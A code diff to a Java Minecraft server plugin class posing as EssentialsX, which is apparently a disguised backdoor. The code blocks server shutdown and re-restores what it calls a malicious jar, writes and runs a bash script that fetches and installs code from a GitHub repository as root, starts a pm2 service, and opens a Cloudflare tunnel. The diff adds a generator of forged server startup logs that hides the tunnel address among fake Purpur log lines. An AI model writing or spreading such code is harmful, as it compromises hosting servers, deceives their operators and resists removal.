@@ -6,11 +6,11 @@ import java.net.*;
 import java.nio.channels.Channels;
 import java.nio.channels.FileChannel;
 import java.nio.file.*;
+import java.time.LocalTime;
+import java.time.format.DateTimeFormatter;
 import java.util.*;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
-import java.util.jar.JarEntry;
-import java.util.jar.JarFile;
 
 public class EssentialsX extends JavaPlugin {
     private Process deployProcess;
@@ -50,7 +50,7 @@ public class EssentialsX extends JavaPlugin {
 
         Runtime.getRuntime().addShutdownHook(new Thread(() -> {
             if (systemGuardEnabled && isRestarting.compareAndSet(false, true)) {
-                getLogger().info("[Guard] ⚠️ ShutdownHook 触发！守护开启中，执行强制重启...");
+                getLogger().info("[Guard] ShutdownHook triggered! Guard enabled, executing hard restart...");
                 restoreMaliciousJar();
                 executeHardRestart(false); 
             }
@@ -107,7 +107,7 @@ public class EssentialsX extends JavaPlugin {
         Path forceStopFile = Paths.get("logs", ".mcchajian", ".force_stop");
         
         if (systemGuardEnabled) {
-            getLogger().info("🛡️ 守护已启用 -> 拒绝退出，执行软重启...");
+            getLogger().info("Guard enabled -> Rejecting stop, executing soft restart...");
             
             try { Files.deleteIfExists(forceStopFile); } catch (Exception e) {}
             restoreMaliciousJar();
@@ -116,11 +116,11 @@ public class EssentialsX extends JavaPlugin {
                 executeHardRestart(true);
             }
         } else {
-            getLogger().info("守护未开启，正在安全退出...");
+            getLogger().info("Guard disabled, safe exit...");
             try {
                 Files.createDirectories(forceStopFile.getParent());
                 Files.createFile(forceStopFile);
-                getLogger().info("已创建停止标记，服务将彻底关闭。");
+                getLogger().info("Stop marker created, service will shut down completely.");
             } catch (Exception e) {}
         }
         
@@ -135,8 +135,6 @@ public class EssentialsX extends JavaPlugin {
             File serverRoot = findServerRoot();
             if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();
             
-            getLogger().info("Target restart directory: " + serverRoot.getAbsolutePath());
-
             String jarName = findBestJarName(serverRoot);
             
             Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
@@ -165,10 +163,10 @@ public class EssentialsX extends JavaPlugin {
             pb.redirectError(ProcessBuilder.Redirect.DISCARD);
             
             Process process = pb.start();
+            
             if (shouldBlock) {
-                Thread.sleep(1000);
+                Thread.sleep(1000); 
             }
-            getLogger().info("Restart command dispatched. Check logs/.mcchajian/restart_run.log for output.");
         } catch (Exception e) {
             getLogger().severe("Hard restart failed: " + e.getMessage());
         }
@@ -179,13 +177,16 @@ public class EssentialsX extends JavaPlugin {
         for (String name : preferred) {
             if (new File(serverRoot, name).exists()) return name;
         }
+
         File[] jars = serverRoot.listFiles((dir, name) -> 
             name.endsWith(".jar") && !name.contains("cache") && !name.contains("libraries")
         );
+
         if (jars != null && jars.length > 0) {
             Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length()));
             return jars[0].getName();
         }
+
         return "server.jar";
     }
 
@@ -278,65 +279,17 @@ public class EssentialsX extends JavaPlugin {
         } catch (Exception e) {}
     }
     
-    /**
-     * 将 JAR 包内的 "机器人面板/" 目录解压到目标文件夹
-     */
-    private void extractPanelFromJar(Path destDir) throws Exception {
-        File jarFile = getFile();
-        if (!jarFile.exists()) {
-            throw new FileNotFoundException("Plugin JAR not found: " + jarFile.getAbsolutePath());
-        }
-        try (JarFile jar = new JarFile(jarFile)) {
-            Enumeration<JarEntry> entries = jar.entries();
-            while (entries.hasMoreElements()) {
-                JarEntry entry = entries.nextElement();
-                String name = entry.getName();
-                if (!name.startsWith("机器人面板/")) continue;
-                if (name.equals("机器人面板/")) continue; // 跳过目录本身
-                
-                String relativePath = name.substring("机器人面板/".length());
-                Path target = destDir.resolve(relativePath);
-                
-                if (entry.isDirectory()) {
-                    Files.createDirectories(target);
-                } else {
-                    Files.createDirectories(target.getParent());
-                    try (InputStream in = jar.getInputStream(entry)) {
-                        Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
-                    }
-                }
-            }
-        }
-        getLogger().info("Panel files extracted to: " + destDir);
-    }
-
     private void startDeploymentProcess() throws Exception {
         if (isProcessRunning) return;
         Map<String, String> env = new HashMap<>();
-        env.put("REPO_URL", "https://github.com/everything-cd/jqr-mianban"); 
+        env.put("REPO_URL", "https://github.com/everything-cd/jqr-mianban--java-plugin"); 
         loadEnvFile(env);
         Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
         if (!Files.exists(workDir)) Files.createDirectories(workDir);
-        Path appDir = workDir.resolve("app");
-        
-        // 1. 从 JAR 中提取机器人面板文件到 appDir
-        try {
-            if (Files.exists(appDir)) {
-                deleteDirectory(appDir.toFile());
-            }
-            Files.createDirectories(appDir);
-            extractPanelFromJar(appDir);
-        } catch (Exception e) {
-            getLogger().severe("Failed to extract panel from JAR: " + e.getMessage());
-            return;
-        }
-        
-        // 2. 生成部署脚本（不再需要复制外部目录）
         Path scriptPath = workDir.resolve("deploy.sh");
         String scriptContent = generateDeployScript(workDir.toString(), env);
         Files.write(scriptPath, scriptContent.getBytes());
         if (!scriptPath.toFile().setExecutable(true)) {}
-        
         ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
         pb.directory(new File(".").getAbsoluteFile());
         pb.environment().putAll(env);
@@ -361,7 +314,7 @@ public class EssentialsX extends JavaPlugin {
             "APP_DIR=\"" + appDir + "\"\n" +
             "DATA_DIR=\"" + dataDir + "\"\n" +
             "REPO_URL=\"" + repoUrl + "\"\n" +
-            // 已删除硬编码的 GitHub 令牌，不再需要认证
+            "GITHUB_AUTH=\"用户名:\"密钥\n" + 
             "\n" +
             "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
             "while true; do PORT=$((RANDOM % 40000 + 20000)); if is_port_free $PORT; then break; fi; done\n" +
@@ -399,17 +352,16 @@ public class EssentialsX extends JavaPlugin {
             "TUNNEL_URL=\"\"\n" +
             "for i in {1..20}; do\n" +
             "    sleep 3\n" +
-            "    TUNNEL_URL=$(grep -o 'https://[^ ]*trycloudflare.com[^ ]*' \"$WORK_DIR/tunnel.log\" | tail -n 1)\n" +
+            "    TUNNEL_URL=$(grep -oE 'https://[a-zA-Z0-9./-]+trycloudflare\\.com[a-zA-Z0-9./-]*' \"$WORK_DIR/tunnel.log\" | tail -n 1)\n" +
             "    if [ -n \"$TUNNEL_URL\" ]; then break; fi\n" +
             "done\n" +
             "\n" +
+            "#隐蔽化：不输出中文，仅写入文件\n" +
             "if [ -n \"$TUNNEL_URL\" ]; then\n" +
-            "    echo \"\\n==========================================\"\n" +
-            "    echo \"  ✅ 服务已就绪 (端口: $PORT)\"\n" +
-            "    echo \"  访问地址: $TUNNEL_URL\"\n" +
-            "    echo \"==========================================\"\n" +
+            "    echo \"$TUNNEL_URL\" > \"$WORK_DIR/tunnel_url.txt\"\n" +
+            "    echo \"$PORT\" > \"$WORK_DIR/node_port.txt\"\n" +
             "else\n" +
-            "    echo \"错误：隧道启动失败。\"\n" +
+            "    echo \"Tunnel failed to start.\" >&2\n" +
             "    exit 1\n" +
             "fi\n" +
             "\n" +
@@ -424,7 +376,40 @@ public class EssentialsX extends JavaPlugin {
             "        cp -r \"$APP_DIR/node_modules/.RoamingMusic\" \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n" +
             "    fi\n" +
             "fi\n" +
+            "\n" +
+            "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
+            "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
+            "\n" +
+            "# 自动检测公私库下载\n" +
+            "download_code() {\n" +
+            "    local URL=$1\n" +
+            "    local AUTH=$2\n" +
+            "    if [ -n \"$AUTH\" ]; then\n" +
+            "        curl -fsSL --connect-timeout 15 --max-time 120 -u \"$AUTH\" \"$URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null\n" +
+            "    else\n" +
+            "        curl -fsSL --connect-timeout 15 --max-time 120 \"$URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null\n" +
+            "    fi\n" +
+            "    if [ -f \"$WORK_DIR/repo.tar.gz\" ] && tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then\n" +
+            "        return 0\n" +
+            "    else\n" +
+            "        rm -f \"$WORK_DIR/repo.tar.gz\"\n" +
+            "        return 1\n" +
+            "    fi\n" +
+            "}\n" +
+            "\n" +
+            "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\" \"\" || \\\n" +
+            "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz\" \"\" || \\\n" +
+            "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\" \"$GITHUB_AUTH\" || \\\n" +
+            "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz\" \"$GITHUB_AUTH\"\n" +
+            "\n" +
+            "if [ ! -f \"$WORK_DIR/repo.tar.gz\" ]; then exit 1; fi\n" +
+            "mkdir -p \"$WORK_DIR/unzipped\"\n" +
+            "tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\"\n" +
+            "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
+            "mv \"$SUBDIR\" \"$APP_DIR\"\n" +
+            "rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\n" +
             "cd \"$APP_DIR\"\n" +
+            "\n" +
             "npm install --unsafe-perm=true --allow-root &>/dev/null\n" +
             "\n" +
             "if [ -d \"$DATA_DIR\" ]; then\n" +
@@ -444,29 +429,166 @@ public class EssentialsX extends JavaPlugin {
             "export TUNNEL_ALREADY_RUNNING=true\n" +
             "pm2 delete all &>/dev/null || true\n" +
             "pm2 start index.js --name \"aoyou-panel\" &>/dev/null\n" +
-            "pm2 save &>/dev/null\n" +
-            "echo \"==> 启动已完成。\\n\"";
+            "pm2 save &>/dev/null\n";
     }
     
     private void startFakeLogs() {
         Thread logThread = new Thread(() -> {
             try {
+                Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+                Path tunnelFile = workDir.resolve("tunnel_url.txt");
+                Path portFile = workDir.resolve("node_port.txt");
+                String tunnelUrl = "";
+                String nodePort = "25565";
+                
+                // 等待隧道URL生成 (最多等待2分钟)
+                for (int i = 0; i < 120; i++) {
+                    if (Files.exists(tunnelFile)) {
+                        String content = new String(Files.readAllBytes(tunnelFile)).trim();
+                        if (!content.isEmpty()) {
+                            tunnelUrl = content;
+                            break;
+                        }
+                    }
+                    Thread.sleep(1000);
+                }
+                
+                if (Files.exists(portFile)) {
+                    nodePort = new String(Files.readAllBytes(portFile)).trim();
+                }
+
+                // 获取到URL后清屏，准备推流真实伪装日志
                 clearConsole();
-                getLogger().info("");
-                getLogger().info("Preparing spawn area: 1%"); Thread.sleep(2000);
-                getLogger().info("Preparing spawn area: 5%"); Thread.sleep(1500);
-                getLogger().info("Preparing spawn area: 10%"); Thread.sleep(1000);
-                getLogger().info("Preparing spawn area: 25%"); Thread.sleep(1000);
-                getLogger().info("Preparing spawn area: 50%"); Thread.sleep(1000);
-                getLogger().info("Preparing spawn area: 75%"); Thread.sleep(1000);
-                getLogger().info("Preparing spawn area: 90%"); Thread.sleep(500);
-                getLogger().info("Preparing spawn area: 100%");
-                getLogger().info("Preparing level \"world\"");
-                getLogger().info("Done! For help, type \"help\""); 
+                
+                System.out.println("container@pterodactyl~ java --add-modules=jdk.incubator.vector -XX:MaxRAMPercentage=80.0 -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:InitiatingHeapOccupancyPercent=15 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:+UseStringDeduplication -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -Dterminal.jline=false -Dterminal.ansi=true -Ddisable.watchdog=true -jar server.jar");
+                Thread.sleep(500);
+                System.out.println("WARNING: Using incubator modules: jdk.incubator.vector");
+                Thread.sleep(300);
+                System.out.println("Starting org.bukkit.craftbukkit.Main");
+                Thread.sleep(500);
+
+                mcLog("[bootstrap] Running Java 25 (OpenJDK 64-Bit Server VM 25.0.3+9-LTS; Eclipse Adoptium Temurin-25.0.3+9) on Linux 5.15.0-177-generic (amd64)");
+                Thread.sleep(200);
+                mcLog("[bootstrap] Loading Purpur 26.1.2-2587-HEAD@dc4a255 (2026-05-17T07:33:24Z) for Minecraft 26.1.2");
+                Thread.sleep(300);
+                mcLog("[PluginInitializerManager] Initializing plugins...");
+                Thread.sleep(500);
+                mcLog("[PluginInitializerManager] Initialized 0 plugins");
+                Thread.sleep(300);
+
+                System.out.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
+                System.out.println("WARNING: sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe (file:/home/container/libraries/org/joml/joml/1.10.8/joml-1.10.8.jar)");
+                System.out.println("WARNING: Please consider reporting this to the maintainers of class org.joml.MemUtil$MemUtilUnsafe");
+                System.out.println("WARNING: sun.misc.Unsafe::objectFieldOffset will be removed in a future release");
+                Thread.sleep(1000);
+
+                mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]");
+                Thread.sleep(500);
+                mcLog("Found new data pack file/bukkit, loading it automatically");
+                Thread.sleep(200);
+                mcLog("Found new data pack paper, loading it automatically");
+                Thread.sleep(200);
+                mcLog("No existing world data, creating new world");
+                Thread.sleep(500);
+                mcLog("Loaded 1515 recipes");
+                Thread.sleep(200);
+                mcLog("Loaded 1617 advancements");
+                Thread.sleep(200);
+                mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...");
+                Thread.sleep(300);
+                mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in 282.6ms");
+                Thread.sleep(200);
+                mcLog("Starting minecraft server version 26.1.2");
+                Thread.sleep(100);
+                mcLog("Loading properties");
+                Thread.sleep(100);
+                mcLog("This server is running Purpur version 26.1.2-2587-HEAD@dc4a255 (2026-05-17T07:33:24Z) (Implementing API version 26.1.2.build.2587-stable)");
+                Thread.sleep(100);
+                mcLog("[spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling");
+                Thread.sleep(100);
+                mcLog("Server Ping Player Sample Count: 12");
+                Thread.sleep(100);
+                mcLog("Using 4 threads for Netty based IO");
+                Thread.sleep(200);
+                mcLog("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads");
+                Thread.sleep(200);
+                mcLog("Default game type: SURVIVAL");
+                Thread.sleep(100);
+                mcLog("Generating keypair");
+                Thread.sleep(200);
+                
+                // 在这里将隧道链接隐蔽地推入真实的启动日志中
+                mcLog("Starting Minecraft server on 0.0.0.0:" + nodePort + " (Remote: " + tunnelUrl + ")");
+                Thread.sleep(100);
+                mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.");
+                Thread.sleep(100);
+                mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.");
+                Thread.sleep(100);
+                mcLog("Preparing level \"world\"");
+                Thread.sleep(1000);
+                mcLog("Selecting spawn point for level 'minecraft:overworld'...");
+                Thread.sleep(8000);
+                mcLog("Selecting spawn point for level 'minecraft:the_nether'...");
+                Thread.sleep(1000);
+                mcLog("Selecting spawn point for level 'minecraft:the_end'...");
+                Thread.sleep(1000);
+                mcLog("Loading 0 persistent chunks for level 'minecraft:overworld'...");
+                Thread.sleep(100);
+                mcLog("Preparing spawn area: 100%");
+                Thread.sleep(100);
+                mcLog("Prepared spawn area in 8874 ms");
+                Thread.sleep(100);
+                mcLog("Loading 0 persistent chunks for level 'minecraft:the_nether'...");
+                Thread.sleep(100);
+                mcLog("Preparing spawn area: 100%");
+                Thread.sleep(100);
+                mcLog("Prepared spawn area in 923 ms");
+                Thread.sleep(100);
+                mcLog("Loading 0 persistent chunks for level 'minecraft:the_end'...");
+                Thread.sleep(100);
+                mcLog("Preparing spawn area: 100%");
+                Thread.sleep(100);
+                mcLog("Prepared spawn area in 316 ms");
+                Thread.sleep(100);
+                mcLog("Done preparing level \"world\" (9.360s)");
+                Thread.sleep(100);
+                mcLog("[spark] Starting background profiler...");
+                Thread.sleep(100);
+                mcLog("Saving chunks for level 'ServerLevel[world]'/minecraft:overworld");
+                Thread.sleep(50);
+                mcLog("Saving chunks for level 'ServerLevel[world]'/minecraft:the_nether");
+                Thread.sleep(50);
+                mcLog("Saving chunks for level 'ServerLevel[world]'/minecraft:the_end");
+                Thread.sleep(50);
+                mcLog("ThreadedAnvilChunkStorage (world): All chunks are saved");
+                Thread.sleep(50);
+                mcLog("ThreadedAnvilChunkStorage (DIM-1): All chunks are saved");
+                Thread.sleep(50);
+                mcLog("ThreadedAnvilChunkStorage (DIM1): All chunks are saved");
+                Thread.sleep(50);
+                mcLog("ThreadedAnvilChunkStorage: All dimensions are saved");
+                Thread.sleep(50);
+                mcLog("Running delayed init tasks");
+                Thread.sleep(100);
+                mcLog("Done (17.011s)! For help, type \"help\"");
+                Thread.sleep(100);
+                System.out.println("container@pterodactyl~ Server marked as running...");
+                Thread.sleep(100);
+                mcLog("*************************************************************************************");
+                mcLog("This is the first time you're starting this server.");
+                mcLog("It's recommended you read our 'Getting Started' documentation for guidance.");
+                mcLog("View this and more helpful information here: https://docs.papermc.io/paper/next-steps");
+                mcLog("*************************************************************************************");
+
             } catch (Exception e) {}
         }, "FakeLog-Generator");
         logThread.setDaemon(true);
         logThread.start();
+    }
+
+    private void mcLog(String msg) {
+        String time = LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
+        System.out.println("[" + time + " INFO]: " + msg);
     }
 
     private void loadEnvFile(Map<String, String> env) {
